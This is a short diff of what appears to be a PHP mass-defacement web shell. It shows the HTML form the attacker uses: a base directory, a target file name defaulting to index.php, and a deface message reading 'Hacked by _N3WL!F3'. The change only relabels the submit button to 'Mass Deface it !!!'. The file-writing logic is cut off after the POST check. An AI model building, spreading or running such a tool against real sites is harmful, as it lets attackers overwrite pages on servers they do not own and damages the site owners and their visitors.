@@ -16,7 +16,7 @@ echo "<img src='https://image.spreadshirtmedia.net/image-server/v1/designs/14727
 <input cols='10' rows='10' type='text' style='color:lime;background-color:#000000' name='base_dir' value='".getcwd ()."'><br><br>";
 echo "<font color='black'>Name of File</font><br><input cols='10' rows='10' type='text' style='color:lime;background-color:#000000' name='andela' value='index.php'><br>";
 echo "<font color='black'>Script Deface</font><br><textarea cols='25' rows='8' style='color:lime;background-color:#000000;background-image:url(http://ac-team.ml/bg.jpg);' name='index'>Hacked by _N3WL!F3</textarea><br>";
-echo "<input type='submit' value='Mass !!!'></form></center>";
+echo "<input type='submit' value='Mass Deface it !!!'></form></center>";
  
 if (isset ($_POST['base_dir']))
 {
